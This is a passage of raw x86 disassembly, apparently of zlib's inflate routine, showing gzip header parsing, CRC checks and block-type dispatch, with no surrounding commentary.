   1ba9e:	push   eax
   1ba9f:	mov    eax,DWORD PTR [esi+0x34]
   1baa2:	add    eax,DWORD PTR [esi+0x30]
   1baa5:	push   eax
   1baa6:	call   0x1dade
   1baab:	mov    eax,DWORD PTR [ebp-0x4]
   1baae:	add    esp,0xc
   1bab1:	sub    ebx,eax
   1bab3:	je     0x1bad2
   1bab5:	mov    eax,DWORD PTR [edi+0xc]
   1bab8:	push   ebx
   1bab9:	sub    eax,ebx
   1babb:	push   eax
   1babc:	push   DWORD PTR [esi+0x34]
   1babf:	call   0x1dade
   1bac4:	add    esp,0xc
   1bac7:	mov    DWORD PTR [esi+0x30],ebx
   1baca:	mov    eax,DWORD PTR [esi+0x28]
   1bacd:	mov    DWORD PTR [esi+0x2c],eax
   1bad0:	jmp    0x1baef
   1bad2:	add    DWORD PTR [esi+0x30],eax
   1bad5:	mov    ecx,DWORD PTR [esi+0x30]
   1bad8:	mov    edx,DWORD PTR [esi+0x28]
   1badb:	cmp    ecx,edx
   1badd:	jne    0x1bae3
   1badf:	and    DWORD PTR [esi+0x30],0x0
   1bae3:	mov    ecx,DWORD PTR [esi+0x2c]
   1bae6:	cmp    ecx,edx
   1bae8:	jae    0x1baef
   1baea:	add    ecx,eax
   1baec:	mov    DWORD PTR [esi+0x2c],ecx
   1baef:	xor    eax,eax
   1baf1:	pop    esi
   1baf2:	pop    ebx
   1baf3:	leave  
   1baf4:	ret    
   1baf5:	int3   
   1baf6:	int3   
   1baf7:	int3   
   1baf8:	int3   
   1baf9:	int3   
   1bafa:	mov    edi,edi
   1bafc:	push   ebp
   1bafd:	mov    ebp,esp
   1baff:	mov    edx,DWORD PTR [ebp+0x8]
   1bb02:	sub    esp,0x2c
   1bb05:	push   ebx
   1bb06:	xor    eax,eax
   1bb08:	push   esi
   1bb09:	push   edi
   1bb0a:	cmp    edx,eax
   1bb0c:	je     0x1bb5c
   1bb0e:	mov    esi,DWORD PTR [edx+0x1c]
   1bb11:	cmp    esi,eax
   1bb13:	je     0x1bb5c
   1bb15:	cmp    DWORD PTR [edx+0xc],eax
   1bb18:	je     0x1bb5c
   1bb1a:	cmp    DWORD PTR [edx],eax
   1bb1c:	jne    0x1bb23
   1bb1e:	cmp    DWORD PTR [edx+0x4],eax
   1bb21:	jne    0x1bb5c
   1bb23:	cmp    DWORD PTR [esi],0xb
   1bb26:	jne    0x1bb2e
   1bb28:	mov    DWORD PTR [esi],0xc
   1bb2e:	mov    eax,DWORD PTR [edx+0xc]
   1bb31:	mov    ecx,DWORD PTR [edx+0x10]
   1bb34:	and    DWORD PTR [ebp-0x24],0x0
   1bb38:	mov    ebx,DWORD PTR [esi+0x38]
   1bb3b:	mov    edi,DWORD PTR [esi+0x3c]
   1bb3e:	mov    DWORD PTR [ebp-0x18],eax
   1bb41:	mov    eax,DWORD PTR [edx]
   1bb43:	mov    DWORD PTR [ebp-0x4],eax
   1bb46:	mov    eax,DWORD PTR [edx+0x4]
   1bb49:	mov    DWORD PTR [ebp-0x8],eax
   1bb4c:	mov    DWORD PTR [ebp-0x2c],eax
   1bb4f:	mov    eax,DWORD PTR [esi]
   1bb51:	mov    DWORD PTR [ebp-0x14],ecx
   1bb54:	mov    DWORD PTR [ebp-0x1c],ecx
   1bb57:	cmp    eax,0x1c
   1bb5a:	jbe    0x1bb69
   1bb5c:	push   0xfffffffe
   1bb5e:	pop    eax
   1bb5f:	pop    edi
   1bb60:	pop    esi
   1bb61:	pop    ebx
   1bb62:	leave  
   1bb63:	ret    0x8
   1bb66:	mov    edx,DWORD PTR [ebp+0x8]
   1bb69:	jmp    DWORD PTR [eax*4+0x1cca6]
   1bb70:	mov    eax,DWORD PTR [esi+0x8]
   1bb73:	test   eax,eax
   1bb75:	jne    0x1bba1
   1bb77:	mov    DWORD PTR [esi],0xc
   1bb7d:	jmp    0x1cb77
   1bb82:	cmp    DWORD PTR [ebp-0x8],0x0
   1bb86:	je     0x1cbc5
   1bb8c:	mov    ecx,DWORD PTR [ebp-0x4]
   1bb8f:	movzx  edx,BYTE PTR [ecx]
   1bb92:	dec    DWORD PTR [ebp-0x8]
   1bb95:	mov    ecx,edi
   1bb97:	shl    edx,cl
   1bb99:	add    ebx,edx
   1bb9b:	inc    DWORD PTR [ebp-0x4]
   1bb9e:	add    edi,0x8
   1bba1:	cmp    edi,0x10
   1bba4:	jb     0x1bb82
   1bba6:	test   al,0x2
   1bba8:	je     0x1bbe5
   1bbaa:	cmp    ebx,0x8b1f
   1bbb0:	jne    0x1bbe5
   1bbb2:	xor    edi,edi
   1bbb4:	push   edi
   1bbb5:	push   edi
   1bbb6:	push   edi
   1bbb7:	call   0x1da28
   1bbbc:	mov    DWORD PTR [esi+0x18],eax
   1bbbf:	push   0x2
   1bbc1:	lea    eax,[ebp-0x10]
   1bbc4:	push   eax
   1bbc5:	mov    BYTE PTR [ebp-0x10],0x1f
   1bbc9:	mov    BYTE PTR [ebp-0xf],0x8b
   1bbcd:	push   DWORD PTR [esi+0x18]
   1bbd0:	call   0x1da28
   1bbd5:	mov    DWORD PTR [esi+0x18],eax
   1bbd8:	xor    ebx,ebx
   1bbda:	mov    DWORD PTR [esi],0x1
   1bbe0:	jmp    0x1cb77
   1bbe5:	mov    eax,DWORD PTR [esi+0x20]
   1bbe8:	and    DWORD PTR [esi+0x10],0x0
   1bbec:	test   eax,eax
   1bbee:	je     0x1bbf4
   1bbf0:	or     DWORD PTR [eax+0x30],0xffffffff
   1bbf4:	test   BYTE PTR [esi+0x8],0x1
   1bbf8:	je     0x1bc7e
   1bbfe:	movzx  eax,bl
   1bc01:	shl    eax,0x8
   1bc04:	mov    ecx,ebx
   1bc06:	shr    ecx,0x8
   1bc09:	add    eax,ecx
   1bc0b:	push   0x1f
   1bc0d:	xor    edx,edx
   1bc0f:	pop    ecx
   1bc10:	div    ecx
   1bc12:	test   edx,edx
   1bc14:	jne    0x1bc7e
   1bc16:	mov    eax,ebx
   1bc18:	and    al,0xf
   1bc1a:	cmp    al,0x8
   1bc1c:	je     0x1bc2d
   1bc1e:	mov    eax,DWORD PTR [ebp+0x8]
   1bc21:	mov    DWORD PTR [eax+0x18],0x1ee24
   1bc28:	jmp    0x1cb71
   1bc2d:	shr    ebx,0x4
   1bc30:	mov    ecx,ebx
   1bc32:	and    ecx,0xf
   1bc35:	add    ecx,0x8
   1bc38:	sub    edi,0x4
   1bc3b:	cmp    ecx,DWORD PTR [esi+0x24]
   1bc3e:	jbe    0x1bc4f
   1bc40:	mov    eax,DWORD PTR [ebp+0x8]
   1bc43:	mov    DWORD PTR [eax+0x18],0x1ee10
   1bc4a:	jmp    0x1cb71
   1bc4f:	xor    eax,eax
   1bc51:	xor    edi,edi
   1bc53:	inc    eax
   1bc54:	push   edi
   1bc55:	shl    eax,cl
   1bc57:	push   edi
   1bc58:	push   edi
   1bc59:	mov    DWORD PTR [esi+0x14],eax
   1bc5c:	call   0x1d586
   1bc61:	mov    ecx,DWORD PTR [ebp+0x8]
   1bc64:	shr    ebx,0x8
   1bc67:	not    ebx
   1bc69:	and    ebx,0x2
   1bc6c:	or     ebx,0x9
   1bc6f:	mov    DWORD PTR [esi+0x18],eax
   1bc72:	mov    DWORD PTR [ecx+0x30],eax
   1bc75:	mov    DWORD PTR [esi],ebx
   1bc77:	xor    ebx,ebx
   1bc79:	jmp    0x1cb77
   1bc7e:	mov    eax,DWORD PTR [ebp+0x8]
   1bc81:	mov    DWORD PTR [eax+0x18],0x1edf8
   1bc88:	mov    DWORD PTR [esi],0x1b
   1bc8e:	nop
   1bc8f:	jmp    0x1cb77
   1bc94:	cmp    edi,0x10
   1bc97:	jae    0x1bcc0
   1bc99:	cmp    DWORD PTR [ebp-0x8],0x0
   1bc9d:	je     0x1cbc5
   1bca3:	mov    eax,DWORD PTR [ebp-0x4]
   1bca6:	movzx  eax,BYTE PTR [eax]
   1bca9:	dec    DWORD PTR [ebp-0x8]
   1bcac:	mov    ecx,edi
   1bcae:	shl    eax,cl
   1bcb0:	add    edi,0x8
   1bcb3:	add    ebx,eax
   1bcb5:	inc    DWORD PTR [ebp-0x4]
   1bcb8:	cmp    edi,0x10
   1bcbb:	jb     0x1bc99
   1bcbd:	mov    edx,DWORD PTR [ebp+0x8]
   1bcc0:	mov    DWORD PTR [esi+0x10],ebx
   1bcc3:	cmp    bl,0x8
   1bcc6:	je     0x1bcd4
   1bcc8:	mov    DWORD PTR [edx+0x18],0x1ee24
   1bccf:	jmp    0x1cb71
   1bcd4:	test   ebx,0xe000
   1bcda:	je     0x1bce8
   1bcdc:	mov    DWORD PTR [edx+0x18],0x1edde
   1bce3:	jmp    0x1cb71
   1bce8:	mov    eax,DWORD PTR [esi+0x20]
   1bceb:	test   eax,eax
   1bced:	je     0x1bcf9
   1bcef:	mov    ecx,ebx
   1bcf1:	shr    ecx,0x8
   1bcf4:	and    ecx,0x1
   1bcf7:	mov    DWORD PTR [eax],ecx
   1bcf9:	test   DWORD PTR [esi+0x10],0x200
   1bd00:	je     0x1bd1f
   1bd02:	mov    BYTE PTR [ebp-0x10],bl
   1bd05:	push   0x2
   1bd07:	lea    eax,[ebp-0x10]
   1bd0a:	shr    ebx,0x8
   1bd0d:	push   eax
   1bd0e:	mov    BYTE PTR [ebp-0xf],bl
   1bd11:	push   DWORD PTR [esi+0x18]
   1bd14:	call   0x1da28
   1bd19:	mov    edx,DWORD PTR [ebp+0x8]
   1bd1c:	mov    DWORD PTR [esi+0x18],eax
   1bd1f:	nop
   1bd20:	xor    ebx,ebx
   1bd22:	xor    edi,edi
   1bd24:	mov    DWORD PTR [esi],0x2
   1bd2a:	cmp    edi,0x20
   1bd2d:	jae    0x1bd56
   1bd2f:	cmp    DWORD PTR [ebp-0x8],0x0
   1bd33:	je     0x1cbc5
   1bd39:	mov    eax,DWORD PTR [ebp-0x4]
   1bd3c:	movzx  eax,BYTE PTR [eax]
   1bd3f:	dec    DWORD PTR [ebp-0x8]
   1bd42:	mov    ecx,edi
   1bd44:	shl    eax,cl
   1bd46:	add    edi,0x8
   1bd49:	add    ebx,eax
   1bd4b:	inc    DWORD PTR [ebp-0x4]
   1bd4e:	cmp    edi,0x20
   1bd51:	jb     0x1bd2f
   1bd53:	mov    edx,DWORD PTR [ebp+0x8]
   1bd56:	mov    eax,DWORD PTR [esi+0x20]
   1bd59:	test   eax,eax
   1bd5b:	je     0x1bd60
   1bd5d:	mov    DWORD PTR [eax+0x4],ebx
   1bd60:	test   DWORD PTR [esi+0x10],0x200
   1bd67:	je     0x1bd96
   1bd69:	mov    eax,ebx
   1bd6b:	shr    eax,0x8
   1bd6e:	mov    BYTE PTR [ebp-0xf],al
   1bd71:	mov    eax,ebx
   1bd73:	shr    eax,0x10
   1bd76:	mov    BYTE PTR [ebp-0xe],al
   1bd79:	mov    BYTE PTR [ebp-0x10],bl
   1bd7c:	push   0x4
   1bd7e:	lea    eax,[ebp-0x10]
   1bd81:	shr    ebx,0x18
   1bd84:	push   eax
   1bd85:	mov    BYTE PTR [ebp-0xd],bl
   1bd88:	push   DWORD PTR [esi+0x18]
   1bd8b:	call   0x1da28
   1bd90:	mov    edx,DWORD PTR [ebp+0x8]
   1bd93:	mov    DWORD PTR [esi+0x18],eax
   1bd96:	xor    ebx,ebx
   1bd98:	xor    edi,edi
   1bd9a:	mov    DWORD PTR [esi],0x3
   1bda0:	cmp    edi,0x10
   1bda3:	jae    0x1bdcc
   1bda5:	cmp    DWORD PTR [ebp-0x8],0x0
   1bda9:	je     0x1cbc5
   1bdaf:	mov    eax,DWORD PTR [ebp-0x4]
   1bdb2:	movzx  eax,BYTE PTR [eax]
   1bdb5:	dec    DWORD PTR [ebp-0x8]
   1bdb8:	mov    ecx,edi
   1bdba:	shl    eax,cl
   1bdbc:	add    edi,0x8
   1bdbf:	add    ebx,eax
   1bdc1:	inc    DWORD PTR [ebp-0x4]
   1bdc4:	cmp    edi,0x10
   1bdc7:	jb     0x1bda5
   1bdc9:	mov    edx,DWORD PTR [ebp+0x8]
   1bdcc:	mov    eax,DWORD PTR [esi+0x20]
   1bdcf:	test   eax,eax
   1bdd1:	je     0x1bde9
   1bdd3:	mov    ecx,ebx
   1bdd5:	and    ecx,0xff
   1bddb:	mov    DWORD PTR [eax+0x8],ecx
   1bdde:	mov    ecx,DWORD PTR [esi+0x20]
   1bde1:	mov    eax,ebx
   1bde3:	shr    eax,0x8
   1bde6:	mov    DWORD PTR [ecx+0xc],eax
   1bde9:	test   DWORD PTR [esi+0x10],0x200
   1bdf0:	je     0x1be0f
   1bdf2:	mov    BYTE PTR [ebp-0x10],bl
   1bdf5:	push   0x2
   1bdf7:	lea    eax,[ebp-0x10]
   1bdfa:	shr    ebx,0x8
   1bdfd:	push   eax
   1bdfe:	mov    BYTE PTR [ebp-0xf],bl
   1be01:	push   DWORD PTR [esi+0x18]
   1be04:	call   0x1da28
   1be09:	mov    edx,DWORD PTR [ebp+0x8]
   1be0c:	mov    DWORD PTR [esi+0x18],eax
   1be0f:	xor    ebx,ebx
   1be11:	xor    edi,edi
   1be13:	mov    DWORD PTR [esi],0x4
   1be19:	test   DWORD PTR [esi+0x10],0x400
   1be20:	je     0x1be87
   1be22:	cmp    edi,0x10
   1be25:	jae    0x1be4e
   1be27:	cmp    DWORD PTR [ebp-0x8],0x0
   1be2b:	je     0x1cbc5
   1be31:	mov    eax,DWORD PTR [ebp-0x4]
   1be34:	movzx  eax,BYTE PTR [eax]
   1be37:	dec    DWORD PTR [ebp-0x8]
   1be3a:	mov    ecx,edi
   1be3c:	shl    eax,cl
   1be3e:	add    edi,0x8
   1be41:	add    ebx,eax
   1be43:	inc    DWORD PTR [ebp-0x4]
   1be46:	cmp    edi,0x10
   1be49:	jb     0x1be27
   1be4b:	mov    edx,DWORD PTR [ebp+0x8]
   1be4e:	mov    eax,DWORD PTR [esi+0x20]
   1be51:	mov    DWORD PTR [esi+0x40],ebx
   1be54:	test   eax,eax
   1be56:	je     0x1be5b
   1be58:	mov    DWORD PTR [eax+0x14],ebx
   1be5b:	test   DWORD PTR [esi+0x10],0x200
   1be62:	je     0x1be81
   1be64:	mov    BYTE PTR [ebp-0x10],bl
   1be67:	push   0x2
   1be69:	lea    eax,[ebp-0x10]
   1be6c:	shr    ebx,0x8
   1be6f:	push   eax
   1be70:	mov    BYTE PTR [ebp-0xf],bl
   1be73:	push   DWORD PTR [esi+0x18]
   1be76:	call   0x1da28
   1be7b:	mov    edx,DWORD PTR [ebp+0x8]
   1be7e:	mov    DWORD PTR [esi+0x18],eax
   1be81:	xor    ebx,ebx
   1be83:	xor    edi,edi
   1be85:	jmp    0x1be92
   1be87:	mov    eax,DWORD PTR [esi+0x20]
   1be8a:	test   eax,eax
   1be8c:	je     0x1be92
   1be8e:	and    DWORD PTR [eax+0x10],0x0
   1be92:	mov    DWORD PTR [esi],0x5
   1be98:	test   DWORD PTR [esi+0x10],0x400
   1be9f:	je     0x1bf29
   1bea5:	mov    edx,DWORD PTR [esi+0x40]
   1bea8:	mov    eax,DWORD PTR [ebp-0x8]
   1beab:	mov    DWORD PTR [ebp-0xc],edx
   1beae:	cmp    edx,eax
   1beb0:	jbe    0x1beb5
   1beb2:	mov    DWORD PTR [ebp-0xc],eax
   1beb5:	cmp    DWORD PTR [ebp-0xc],0x0
   1beb9:	je     0x1bf1c
   1bebb:	mov    ecx,DWORD PTR [esi+0x20]
   1bebe:	test   ecx,ecx
   1bec0:	je     0x1bef6
   1bec2:	mov    eax,DWORD PTR [ecx+0x10]
   1bec5:	mov    DWORD PTR [ebp-0x28],eax
   1bec8:	test   eax,eax
   1beca:	je     0x1bef6
   1becc:	mov    eax,DWORD PTR [ecx+0x14]
   1becf:	mov    ecx,DWORD PTR [ecx+0x18]
   1bed2:	sub    eax,edx
   1bed4:	mov    edx,DWORD PTR [ebp-0xc]
   1bed7:	add    edx,eax
   1bed9:	cmp    edx,ecx
   1bedb:	jbe    0x1bee1
   1bedd:	sub    ecx,eax
   1bedf:	jmp    0x1bee4
   1bee1:	mov    ecx,DWORD PTR [ebp-0xc]
   1bee4:	push   ecx
   1bee5:	mov    ecx,DWORD PTR [ebp-0x28]
   1bee8:	push   DWORD PTR [ebp-0x4]
   1beeb:	add    ecx,eax
   1beed:	push   ecx
   1beee:	call   0x1dade
   1bef3:	add    esp,0xc
   1bef6:	test   DWORD PTR [esi+0x10],0x200
   1befd:	je     0x1bf10
   1beff:	push   DWORD PTR [ebp-0xc]
   1bf02:	push   DWORD PTR [ebp-0x4]
   1bf05:	push   DWORD PTR [esi+0x18]
   1bf08:	call   0x1da28
   1bf0d:	mov    DWORD PTR [esi+0x18],eax
   1bf10:	mov    eax,DWORD PTR [ebp-0xc]
   1bf13:	sub    DWORD PTR [ebp-0x8],eax
   1bf16:	add    DWORD PTR [ebp-0x4],eax
   1bf19:	sub    DWORD PTR [esi+0x40],eax
   1bf1c:	cmp    DWORD PTR [esi+0x40],0x0
   1bf20:	jne    0x1cbc5
   1bf26:	mov    edx,DWORD PTR [ebp+0x8]
   1bf29:	and    DWORD PTR [esi+0x40],0x0
   1bf2d:	mov    DWORD PTR [esi],0x6
   1bf33:	test   DWORD PTR [esi+0x10],0x800
   1bf3a:	je     0x1bfb7
   1bf3c:	cmp    DWORD PTR [ebp-0x8],0x0
   1bf40:	je     0x1cbc5
   1bf46:	xor    ecx,ecx
   1bf48:	mov    eax,DWORD PTR [ebp-0x4]
   1bf4b:	movzx  eax,BYTE PTR [ecx+eax*1]
   1bf4f:	inc    ecx
   1bf50:	mov    DWORD PTR [ebp-0xc],ecx
   1bf53:	mov    ecx,DWORD PTR [esi+0x20]
   1bf56:	mov    DWORD PTR [ebp-0x20],eax
   1bf59:	test   ecx,ecx
   1bf5b:	je     0x1bf78
   1bf5d:	mov    edx,DWORD PTR [ecx+0x1c]
   1bf60:	mov    DWORD PTR [ebp-0x28],edx
   1bf63:	test   edx,edx
   1bf65:	je     0x1bf78
   1bf67:	mov    edx,DWORD PTR [esi+0x40]
   1bf6a:	cmp    edx,DWORD PTR [ecx+0x20]
   1bf6d:	jae    0x1bf78
   1bf6f:	mov    ecx,DWORD PTR [ebp-0x28]
   1bf72:	mov    BYTE PTR [ecx+edx*1],al
   1bf75:	inc    DWORD PTR [esi+0x40]
   1bf78:	test   eax,eax
   1bf7a:	je     0x1bf84
   1bf7c:	mov    ecx,DWORD PTR [ebp-0xc]
   1bf7f:	cmp    ecx,DWORD PTR [ebp-0x8]
   1bf82:	jb     0x1bf48
   1bf84:	test   DWORD PTR [esi+0x10],0x200
   1bf8b:	je     0x1bfa1
   1bf8d:	push   DWORD PTR [ebp-0xc]
   1bf90:	push   DWORD PTR [ebp-0x4]
   1bf93:	push   DWORD PTR [esi+0x18]
   1bf96:	call   0x1da28
   1bf9b:	mov    DWORD PTR [esi+0x18],eax
   1bf9e:	mov    eax,DWORD PTR [ebp-0x20]
   1bfa1:	mov    ecx,DWORD PTR [ebp-0xc]
   1bfa4:	sub    DWORD PTR [ebp-0x8],ecx
   1bfa7:	add    DWORD PTR [ebp-0x4],ecx
   1bfaa:	test   eax,eax
   1bfac:	jne    0x1cbc5
   1bfb2:	mov    edx,DWORD PTR [ebp+0x8]
   1bfb5:	jmp    0x1bfc2
   1bfb7:	mov    eax,DWORD PTR [esi+0x20]
   1bfba:	test   eax,eax
   1bfbc:	je     0x1bfc2
   1bfbe:	and    DWORD PTR [eax+0x1c],0x0
   1bfc2:	and    DWORD PTR [esi+0x40],0x0
   1bfc6:	mov    DWORD PTR [esi],0x7
   1bfcc:	test   DWORD PTR [esi+0x10],0x1000
   1bfd3:	je     0x1c050
   1bfd5:	cmp    DWORD PTR [ebp-0x8],0x0
   1bfd9:	je     0x1cbc5
   1bfdf:	xor    ecx,ecx
   1bfe1:	mov    eax,DWORD PTR [ebp-0x4]
   1bfe4:	movzx  eax,BYTE PTR [ecx+eax*1]
   1bfe8:	inc    ecx
   1bfe9:	mov    DWORD PTR [ebp-0xc],ecx
   1bfec:	mov    ecx,DWORD PTR [esi+0x20]
   1bfef:	mov    DWORD PTR [ebp-0x20],eax
   1bff2:	test   ecx,ecx
   1bff4:	je     0x1c011
   1bff6:	mov    edx,DWORD PTR [ecx+0x24]
   1bff9:	mov    DWORD PTR [ebp-0x28],edx
   1bffc:	test   edx,edx
   1bffe:	je     0x1c011
   1c000:	mov    edx,DWORD PTR [esi+0x40]
   1c003:	cmp    edx,DWORD PTR [ecx+0x28]
   1c006:	jae    0x1c011
   1c008:	mov    ecx,DWORD PTR [ebp-0x28]
   1c00b:	mov    BYTE PTR [ecx+edx*1],al
   1c00e:	inc    DWORD PTR [esi+0x40]
   1c011:	test   eax,eax
   1c013:	je     0x1c01d
   1c015:	mov    ecx,DWORD PTR [ebp-0xc]
   1c018:	cmp    ecx,DWORD PTR [ebp-0x8]
   1c01b:	jb     0x1bfe1
   1c01d:	test   DWORD PTR [esi+0x10],0x200
   1c024:	je     0x1c03a
   1c026:	push   DWORD PTR [ebp-0xc]
   1c029:	push   DWORD PTR [ebp-0x4]
   1c02c:	push   DWORD PTR [esi+0x18]
   1c02f:	call   0x1da28
   1c034:	mov    DWORD PTR [esi+0x18],eax
   1c037:	mov    eax,DWORD PTR [ebp-0x20]
   1c03a:	mov    ecx,DWORD PTR [ebp-0xc]
   1c03d:	sub    DWORD PTR [ebp-0x8],ecx
   1c040:	add    DWORD PTR [ebp-0x4],ecx
   1c043:	test   eax,eax
   1c045:	jne    0x1cbc5
   1c04b:	mov    edx,DWORD PTR [ebp+0x8]
   1c04e:	jmp    0x1c05b
   1c050:	mov    eax,DWORD PTR [esi+0x20]
   1c053:	test   eax,eax
   1c055:	je     0x1c05b
   1c057:	and    DWORD PTR [eax+0x24],0x0
   1c05b:	mov    DWORD PTR [esi],0x8
   1c061:	test   DWORD PTR [esi+0x10],0x200
   1c068:	je     0x1c0ae
   1c06a:	cmp    edi,0x10
   1c06d:	jae    0x1c096
   1c06f:	cmp    DWORD PTR [ebp-0x8],0x0
   1c073:	je     0x1cbc5
   1c079:	mov    eax,DWORD PTR [ebp-0x4]
   1c07c:	movzx  eax,BYTE PTR [eax]
   1c07f:	dec    DWORD PTR [ebp-0x8]
   1c082:	mov    ecx,edi
   1c084:	shl    eax,cl
   1c086:	add    edi,0x8
   1c089:	add    ebx,eax
   1c08b:	inc    DWORD PTR [ebp-0x4]
   1c08e:	cmp    edi,0x10
   1c091:	jb     0x1c06f
   1c093:	mov    edx,DWORD PTR [ebp+0x8]
   1c096:	movzx  eax,WORD PTR [esi+0x18]
   1c09a:	cmp    ebx,eax
   1c09c:	je     0x1c0aa
   1c09e:	mov    DWORD PTR [edx+0x18],0x1edca
   1c0a5:	jmp    0x1cb71
   1c0aa:	xor    ebx,ebx
   1c0ac:	xor    edi,edi
   1c0ae:	mov    eax,DWORD PTR [esi+0x20]
   1c0b1:	test   eax,eax
   1c0b3:	je     0x1c0c9
   1c0b5:	mov    edx,DWORD PTR [esi+0x10]
   1c0b8:	xor    ecx,ecx
   1c0ba:	inc    ecx
   1c0bb:	sar    edx,0x9
   1c0be:	and    edx,ecx
   1c0c0:	mov    DWORD PTR [eax+0x2c],edx
   1c0c3:	mov    eax,DWORD PTR [esi+0x20]
   1c0c6:	mov    DWORD PTR [eax+0x30],ecx
   1c0c9:	xor    eax,eax
   1c0cb:	push   eax
   1c0cc:	push   eax
   1c0cd:	push   eax
   1c0ce:	call   0x1da28
   1c0d3:	mov    ecx,DWORD PTR [ebp+0x8]
   1c0d6:	mov    DWORD PTR [esi+0x18],eax
   1c0d9:	mov    DWORD PTR [ecx+0x30],eax
   1c0dc:	jmp    0x1c7da
   1c0e1:	cmp    edi,0x20
   1c0e4:	jae    0x1c10d
   1c0e6:	cmp    DWORD PTR [ebp-0x8],0x0
   1c0ea:	je     0x1cbc5
   1c0f0:	mov    eax,DWORD PTR [ebp-0x4]
   1c0f3:	movzx  eax,BYTE PTR [eax]
   1c0f6:	dec    DWORD PTR [ebp-0x8]
   1c0f9:	mov    ecx,edi
   1c0fb:	shl    eax,cl
   1c0fd:	add    edi,0x8
   1c100:	add    ebx,eax
   1c102:	inc    DWORD PTR [ebp-0x4]
   1c105:	cmp    edi,0x20
   1c108:	jb     0x1c0e6
   1c10a:	mov    edx,DWORD PTR [ebp+0x8]
   1c10d:	mov    ecx,ebx
   1c10f:	mov    eax,0xff00
   1c114:	and    ecx,eax
   1c116:	mov    edi,ebx
   1c118:	shl    edi,0x10
   1c11b:	add    ecx,edi
   1c11d:	mov    edi,ebx
   1c11f:	shr    edi,0x8
   1c122:	and    edi,eax
   1c124:	shl    ecx,0x8
   1c127:	shr    ebx,0x18
   1c12a:	add    ecx,edi
   1c12c:	lea    eax,[ecx+ebx*1]
   1c12f:	mov    DWORD PTR [esi+0x18],eax
   1c132:	mov    DWORD PTR [edx+0x30],eax
   1c135:	xor    ebx,ebx
   1c137:	xor    edi,edi
   1c139:	mov    DWORD PTR [esi],0xa
   1c13f:	cmp    DWORD PTR [esi+0xc],0x0
   1c143:	je     0x1cb87
   1c149:	xor    eax,eax
   1c14b:	push   eax
   1c14c:	push   eax
   1c14d:	push   eax
   1c14e:	call   0x1d586
   1c153:	mov    ecx,DWORD PTR [ebp+0x8]
   1c156:	mov    DWORD PTR [esi+0x18],eax
   1c159:	mov    DWORD PTR [ecx+0x30],eax
   1c15c:	mov    DWORD PTR [esi],0xb
   1c162:	cmp    DWORD PTR [ebp+0xc],0x5
   1c166:	je     0x1cbc5
   1c16c:	mov    edx,DWORD PTR [ebp+0x8]
   1c16f:	cmp    DWORD PTR [esi+0x4],0x0
   1c173:	je     0x1c189
   1c175:	mov    ecx,edi
   1c177:	and    ecx,0x7
   1c17a:	shr    ebx,cl
   1c17c:	sub    edi,ecx
   1c17e:	mov    DWORD PTR [esi],0x18
   1c184:	jmp    0x1cb77
   1c189:	cmp    edi,0x3
   1c18c:	jae    0x1c1b5
   1c18e:	cmp    DWORD PTR [ebp-0x8],0x0
   1c192:	je     0x1cbc5
   1c198:	mov    eax,DWORD PTR [ebp-0x4]
   1c19b:	movzx  eax,BYTE PTR [eax]
   1c19e:	dec    DWORD PTR [ebp-0x8]
   1c1a1:	mov    ecx,edi
   1c1a3:	shl    eax,cl
   1c1a5:	add    edi,0x8
   1c1a8:	add    ebx,eax
   1c1aa:	inc    DWORD PTR [ebp-0x4]
   1c1ad:	cmp    edi,0x3
   1c1b0:	jb     0x1c18e
   1c1b2:	mov    edx,DWORD PTR [ebp+0x8]
   1c1b5:	mov    eax,ebx
   1c1b7:	and    eax,0x1
   1c1ba:	shr    ebx,1
   1c1bc:	mov    DWORD PTR [esi+0x4],eax
   1c1bf:	mov    eax,ebx
   1c1c1:	and    eax,0x3
   1c1c4:	dec    edi
   1c1c5:	sub    eax,0x0
   1c1c8:	je     0x1c20e
   1c1ca:	dec    eax
   1c1cb:	je     0x1c1ea
   1c1cd:	dec    eax
   1c1ce:	je     0x1c1e2
   1c1d0:	dec    eax
   1c1d1:	jne    0x1c214
   1c1d3:	mov    DWORD PTR [edx+0x18],0x1edb6
   1c1da:	mov    DWORD PTR [esi],0x1b
   1c1e0:	jmp    0x1c214
   1c1e2:	mov    DWORD PTR [esi],0xf
   1c1e8:	jmp    0x1c214
   1c1ea:	mov    DWORD PTR [esi+0x4c],0x7b410
   1c1f1:	mov    DWORD PTR [esi+0x54],0x9
   1c1f8:	mov    DWORD PTR [esi+0x50],0x7bc10
   1c1ff:	mov    DWORD PTR [esi+0x58],0x5
   1c206:	mov    DWORD PTR [esi],0x12
   1c20c:	jmp    0x1c214
   1c20e:	mov    DWORD PTR [esi],0xd
   1c214:	shr    ebx,0x2
   1c217:	dec    edi
   1c218:	dec    edi
   1c219:	jmp    0x1cb77
   1c21e:	mov    ecx,edi
   1c220:	and    ecx,0x7
   1c223:	sub    edi,ecx
   1c225:	shr    ebx,cl
   1c227:	cmp    edi,0x20
   1c22a:	jae    0x1c253
   1c22c:	cmp    DWORD PTR [ebp-0x8],0x0
   1c230:	je     0x1cbc5
   1c236:	mov    eax,DWORD PTR [ebp-0x4]
   1c239:	movzx  eax,BYTE PTR [eax]
   1c23c:	dec    DWORD PTR [ebp-0x8]
   1c23f:	mov    ecx,edi
   1c241:	shl    eax,cl
   1c243:	add    edi,0x8
   1c246:	add    ebx,eax
   1c248:	inc    DWORD PTR [ebp-0x4]
   1c24b:	cmp    edi,0x20
   1c24e:	jb     0x1c22c
   1c250:	mov    edx,DWORD PTR [ebp+0x8]
   1c253:	mov    ecx,ebx
   1c255:	mov    eax,ebx
   1c257:	not    ecx
   1c259:	and    eax,0xffff
   1c25e:	shr    ecx,0x10
   1c261:	cmp    eax,ecx
   1c263:	je     0x1c271
   1c265:	mov    DWORD PTR [edx+0x18],0x1ed98
   1c26c:	jmp    0x1cb71
   1c271:	xor    ebx,ebx
   1c273:	mov    DWORD PTR [esi+0x40],eax
   1c276:	xor    edi,edi
   1c278:	mov    DWORD PTR [esi],0xe
   1c27e:	mov    eax,DWORD PTR [esi+0x40]
   1c281:	mov    DWORD PTR [ebp-0xc],eax
   1c284:	test   eax,eax
   1c286:	je     0x1c7da
   1c28c:	mov    eax,DWORD PTR [ebp-0x8]
   1c28f:	cmp    DWORD PTR [ebp-0xc],eax
   1c292:	jbe    0x1c297
   1c294:	mov    DWORD PTR [ebp-0xc],eax
   1c297:	mov    eax,DWORD PTR [ebp-0x14]
   1c29a:	cmp    DWORD PTR [ebp-0xc],eax
   1c29d:	jbe    0x1c2a2
   1c29f:	mov    DWORD PTR [ebp-0xc],eax
   1c2a2:	cmp    DWORD PTR [ebp-0xc],0x0
   1c2a6:	je     0x1cbc5
   1c2ac:	push   DWORD PTR [ebp-0xc]
